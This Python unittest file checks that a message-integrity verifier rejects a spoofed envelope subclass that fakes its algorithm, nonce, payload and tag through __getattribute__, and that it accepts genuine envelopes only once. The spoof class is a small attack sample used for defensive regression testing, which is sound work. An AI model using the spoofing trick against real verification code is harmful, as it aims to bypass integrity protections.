import unittest

from .crypto import CryptoEnvelope, CryptoIntegrity


class SpoofedCryptoEnvelope(CryptoEnvelope):
    def __getattribute__(self, name):
        if name == "algorithm":
            return "HMAC-SHA256"
        if name == "version":
            return 1
        if name == "domain":
            return "memory"
        if name == "nonce":
            return "spoofed-nonce"
        if name == "counter":
            return 0
        if name == "payload":
            return b'{"spoofed":true}'
        if name == "tag":
            return "0" * 64
        return super().__getattribute__(name)


class CryptoEnvelopeBoundaryTests(unittest.TestCase):
    def setUp(self):
        self.crypto = CryptoIntegrity(b"k" * 32)

    def test_attack_245_crypto_envelope_subclass_is_rejected(self):
        canonical = self.crypto.sign("test", {"value": 1}, 0, nonce="nonce-245")
        spoofed = SpoofedCryptoEnvelope(
            canonical.domain,
            canonical.nonce,
            canonical.counter,
            canonical.payload,
            canonical.tag,
            canonical.algorithm,
            canonical.version,
        )
        self.assertFalse(self.crypto.verify(spoofed))

    def test_attack_246_crypto_envelope_subclass_cannot_bypass_with_valid_tag(self):
        canonical = self.crypto.sign("test", {"value": 2}, 0, nonce="nonce-246")
        spoofed = SpoofedCryptoEnvelope(
            canonical.domain,
            canonical.nonce,
            canonical.counter,
            canonical.payload,
            canonical.tag,
            canonical.algorithm,
            canonical.version,
        )
        self.assertIsNot(type(spoofed), CryptoEnvelope)
        self.assertFalse(self.crypto.verify(spoofed, consume=False))

    def test_attack_247_canonical_crypto_envelope_remains_accepted(self):
        envelope = self.crypto.sign("test", {"value": 3}, 0, nonce="nonce-247")
        self.assertIs(type(envelope), CryptoEnvelope)
        self.assertTrue(self.crypto.verify(envelope))
        self.assertFalse(self.crypto.verify(envelope))


if __name__ == "__main__":
    unittest.main()
